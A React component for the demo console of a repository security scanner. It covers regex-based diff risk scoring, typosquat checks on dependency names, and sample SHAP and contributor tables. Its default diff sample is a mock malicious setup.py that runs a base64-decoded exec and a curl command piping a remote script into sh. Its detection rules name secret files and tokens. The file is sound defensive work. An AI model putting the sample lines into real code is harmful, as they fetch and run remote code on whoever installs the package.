"use client";

import { useState, useMemo } from "react";

const RULES = [
  {
    name: "eval / exec call",
    regex: /\b(eval|exec)\s*\(/,
    weight: 0.3,
    desc: "Runs code built at runtime",
  },
  {
    name: "Shell or subprocess",
    regex: /subprocess|os\.system|Popen/,
    weight: 0.2,
    desc: "Spawns commands on install or import",
  },
  {
    name: "Base64 or hex blob",
    regex: /base64|b64decode|fromhex/,
    weight: 0.15,
    desc: "Hides a payload",
  },
  {
    name: "Hardcoded URL or IP",
    regex: /https?:\/\/|\b\d{1,3}(\.\d{1,3}){3}\b/,
    weight: 0.1,
    desc: "Calls out to unknown hosts",
  },
  {
    name: "Reads secrets",
    regex: /os\.environ|\.ssh|id_rsa|GITHUB_TOKEN/,
    weight: 0.2,
    desc: "Touches tokens and keys",
  },
  {
    name: "CI workflow edit",
    regex: /\.github\/workflows/,
    weight: 0.15,
    desc: "Changes what runs in CI",
  },
];

const POPULAR_PACKAGES = [
  "requests",
  "numpy",
  "pandas",
  "flask",
  "django",
  "urllib3",
  "boto3",
  "setuptools",
  "pytest",
  "cryptography",
  "pyyaml",
  "jinja2",
  "click",
  "scipy",
  "matplotlib",
  "pillow",
  "fastapi",
  "pydantic",
  "sqlalchemy",
  "colorama",
  "certifi",
  "aiohttp",
  "tqdm",
  "rich",
];

function levenshteinDistance(a: string, b: string): number {
  const d: number[][] = [];
  for (let i = 0; i <= a.length; i++) {
    d[i] = [i];
    for (let j = 1; j <= b.length; j++) {
      d[i][j] = i ? 0 : j;
    }
  }
  for (let i = 1; i <= a.length; i++) {
    for (let j = 1; j <= b.length; j++) {
      d[i][j] = Math.min(
        d[i - 1][j] + 1,
        d[i][j - 1] + 1,
        d[i - 1][j - 1] + (a[i - 1] === b[j - 1] ? 0 : 1)
      );
    }
  }
  return d[a.length][b.length];
}

const SHAP_DATA = [
  { feature: "has_eval_exec", value: 0.31 },
  { feature: "has_base64", value: 0.22 },
  { feature: "touches_sensitive", value: 0.14 },
  { feature: "author_age_days", value: 0.09 },
  { feature: "avg_entropy", value: 0.07 },
  { feature: "n_files", value: -0.05 },
  { feature: "author_followers", value: -0.08 },
];

export function LandingConsole() {
  const [activeTab, setActiveTab] = useState<number>(0);

  // Tab 1: Diff analyzer state
  const [diffInput, setDiffInput] = useState<string>(
    `diff --git a/setup.py b/setup.py\n+import base64, os\n+exec(base64.b64decode("aW1wb3J0IG9z"))\n+os.system("curl http://203.0.113.7/p.sh | sh")`
  );
  const [analyzedDiff, setAnalyzedDiff] = useState<string>(diffInput);

  // Tab 2: Dependencies state
  const [depInput, setDepInput] = useState<string>(
    `requests==2.31.0\nreqeusts\nnumpy\nnumpyy`
  );
  const [checkedDeps, setCheckedDeps] = useState<string>(depInput);

  const diffAnalysis = useMemo(() => {
    const hits = new Set<string>();
    const matchedRows: { rule: string; snippet: string }[] = [];

    analyzedDiff.split("\n").forEach((line) => {
      if (!(line.startsWith("+") || line.startsWith("diff"))) return;
      RULES.forEach((rule) => {
        if (rule.regex.test(line)) {
          hits.add(rule.name);
          matchedRows.push({
            rule: rule.name,
            snippet: line.trim().slice(0, 140),
          });
        }
      });
    });

    const totalWeight = Math.min(
      1,
      RULES.filter((r) => hits.has(r.name)).reduce((sum, r) => sum + r.weight, 0)
    );

    const verdict =
      totalWeight >= 0.6 ? "High" : totalWeight >= 0.3 ? "Medium" : "Low";

    return {
      weight: totalWeight,
      verdict,
      matchedRows,
    };
  }, [analyzedDiff]);

  const dependencyResults = useMemo(() => {
    const lines = checkedDeps
      .split("\n")
      .map((l) => l.split("#")[0].split("==")[0].trim().toLowerCase())
      .filter(Boolean);

    return lines.map((name) => {
      let bestMatch = "";
      let minDistance = 99;

      POPULAR_PACKAGES.forEach((pop) => {
        const dist = levenshteinDistance(name, pop);
        if (dist < minDistance) {
          minDistance = dist;
          bestMatch = pop;
        }
      });

      const isPopular = POPULAR_PACKAGES.includes(name);
      const maxLen = Math.max(name.length, bestMatch.length);
      const similarity = Math.round((1 - minDistance / maxLen) * 100);
      const isSuspect = !isPopular && minDistance <= 2 && similarity >= 75;

      return {
        pkg: name,
        closest: isPopular ? "(is popular)" : bestMatch,
        sim: isPopular ? "-" : `${similarity}%`,
        result: isSuspect
          ? "Possible typosquat"
          : isPopular
          ? "Known package"
          : "No lookalike found",
        isSuspect,
        isPopular,
      };
    });
  }, [checkedDeps]);

  const tabs = [
    "Repo scanner",
    "PR analyzer",
    "Dependencies",
    "SHAP",
    "Code scan",
    "Contributors",
    "Metrics",
  ];

  return (
    <div className="landing-card landing-rv">
      <div className="landing-tabs" role="tablist" aria-label="Console tabs">
        {tabs.map((name, idx) => (
          <button
            key={name}
            role="tab"
            aria-selected={activeTab === idx}
            onClick={() => setActiveTab(idx)}
          >
            {name}
          </button>
        ))}
      </div>

      {/* Tab 0: Repo Scanner */}
      <div className={`landing-pn ${activeTab === 0 ? "landing-pn-on" : ""}`}>
        <table>
          <thead>
            <tr>
              <th>Pull request</th>
              <th>Risk</th>
              <th></th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td>owner/repo#101 Fix typo in docs</td>
              <td>0.08</td>
              <td>
                <div className="landing-bar" style={{ width: "8%" }} />
              </td>
            </tr>
            <tr>
              <td>owner/repo#102 Bump lib to 2.3.1</td>
              <td>0.21</td>
              <td>
                <div className="landing-bar" style={{ width: "21%" }} />
              </td>
            </tr>
            <tr>
              <td>owner/repo#103 Update setup.py</td>
              <td>0.87</td>
              <td>
                <div
                  className="landing-bar landing-bar-danger"
                  style={{ width: "87%" }}
                />
              </td>
            </tr>
            <tr>
              <td>owner/repo#104 Add CI cache step</td>
              <td>0.64</td>
              <td>
                <div
                  className="landing-bar landing-bar-danger"
                  style={{ width: "64%" }}
                />
              </td>
            </tr>
          </tbody>
        </table>
        <p className="landing-note">
          Sample rows. The Python app scans live GitHub repos, several at once.
        </p>
      </div>

      {/* Tab 1: PR Analyzer */}
      <div className={`landing-pn ${activeTab === 1 ? "landing-pn-on" : ""}`}>
        <textarea
          id="diff"
          spellCheck={false}
          value={diffInput}
          onChange={(e) => setDiffInput(e.target.value)}
        />
        <p>
          <button
            type="button"
            className="landing-btn landing-btn-fill"
            onClick={() => setAnalyzedDiff(diffInput)}
          >
            Analyze diff
          </button>
        </p>

        <div className="landing-res">
          <strong
            className={
              diffAnalysis.weight >= 0.3 ? "landing-bad" : "landing-ok"
            }
          >
            Risk {diffAnalysis.weight.toFixed(2)} · {diffAnalysis.verdict}
          </strong>
          <div
            className={`landing-bar ${
              diffAnalysis.weight >= 0.3 ? "landing-bar-danger" : ""
            }`}
            style={{
              width: `${Math.max(4, diffAnalysis.weight * 100)}%`,
              margin: "10px 0",
            }}
          />
          {diffAnalysis.matchedRows.length === 0 ? (
            <p className="landing-note">
              No suspicious patterns in the added lines.
            </p>
          ) : (
            <table>
              <thead>
                <tr>
                  <th>Pattern</th>
                  <th>Matched line</th>
                </tr>
              </thead>
              <tbody>
                {diffAnalysis.matchedRows.map((row, i) => (
                  <tr key={i}>
                    <td className="landing-bad">{row.rule}</td>
                    <td>{row.snippet}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          )}
        </div>
        <p className="landing-note">
          Runs on your device with simplified rules. Paste any diff.
        </p>
      </div>

      {/* Tab 2: Dependencies */}
      <div className={`landing-pn ${activeTab === 2 ? "landing-pn-on" : ""}`}>
        <textarea
          id="req"
          spellCheck={false}
          value={depInput}
          onChange={(e) => setDepInput(e.target.value)}
        />
        <p>
          <button
            type="button"
            className="landing-btn landing-btn-fill"
            onClick={() => setCheckedDeps(depInput)}
          >
            Check names
          </button>
        </p>
        <table>
          <thead>
            <tr>
              <th>Package</th>
              <th>Closest popular</th>
              <th>Similarity</th>
              <th>Result</th>
            </tr>
          </thead>
          <tbody>
            {dependencyResults.map((row, i) => (
              <tr key={i}>
                <td>{row.pkg}</td>
                <td>{row.closest}</td>
                <td>{row.sim}</td>
                <td
                  className={
                    row.isSuspect
                      ? "landing-bad"
                      : row.isPopular
                      ? "landing-ok"
                      : ""
                  }
                >
                  {row.result}
                </td>
              </tr>
            ))}
          </tbody>
        </table>
        <p className="landing-note">
          Name lookalike check only. The full app also checks package age,
          releases and known vulnerabilities.
        </p>
      </div>

      {/* Tab 3: SHAP */}
      <div className={`landing-pn ${activeTab === 3 ? "landing-pn-on" : ""}`}>
        <div id="shp">
          {SHAP_DATA.map((row) => (
            <div key={row.feature} className="landing-sh">
              <span>{row.feature}</span>
              <div
                className={`landing-bar ${
                  row.value > 0 ? "landing-bar-danger" : ""
                }`}
                style={{ width: `${Math.abs(row.value) * 220}px` }}
              />
              <span>
                {row.value > 0 ? "+" : ""}
                {row.value.toFixed(2)}
              </span>
            </div>
          ))}
        </div>
        <p className="landing-note">
          Illustrative explanation. The Python app computes real SHAP values for
          every PR and a per-repo heatmap.
        </p>
      </div>

      {/* Tab 4: Code Scan Patterns */}
      <div className={`landing-pn ${activeTab === 4 ? "landing-pn-on" : ""}`}>
        <table>
          <thead>
            <tr>
              <th>Pattern</th>
              <th>What it catches</th>
            </tr>
          </thead>
          <tbody>
            {RULES.map((rule) => (
              <tr key={rule.name}>
                <td>{rule.name}</td>
                <td>{rule.desc}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      {/* Tab 5: Contributors */}
      <div className={`landing-pn ${activeTab === 5 ? "landing-pn-on" : ""}`}>
        <table>
          <thead>
            <tr>
              <th>Author</th>
              <th>Account age</th>
              <th>PRs</th>
              <th>Trust</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td>maintainer-a</td>
              <td>5.2 years</td>
              <td>140</td>
              <td className="landing-ok">High</td>
            </tr>
            <tr>
              <td>contributor-b</td>
              <td>8 months</td>
              <td>6</td>
              <td>Medium</td>
            </tr>
            <tr>
              <td>new-account-91</td>
              <td>3 days</td>
              <td>2</td>
              <td className="landing-bad">Low</td>
            </tr>
          </tbody>
        </table>
        <p className="landing-note">
          Sample rows. The app profiles every author in a scan.
        </p>
      </div>

      {/* Tab 6: Metrics */}
      <div className={`landing-pn ${activeTab === 6 ? "landing-pn-on" : ""}`}>
        <div className="landing-tiles">
          <div>
            <b>-</b>
            <small>AUC</small>
          </div>
          <div>
            <b>-</b>
            <small>Precision</small>
          </div>
          <div>
            <b>-</b>
            <small>Recall</small>
          </div>
          <div>
            <b>-</b>
            <small>Recall on real samples</small>
          </div>
        </div>
        <p className="landing-note">
          Filled in by train.py in the Python app, along with the confusion matrix
          and ROC curve. Synthetic and real recall are always reported
          separately.
        </p>
      </div>
    </div>
  );
}

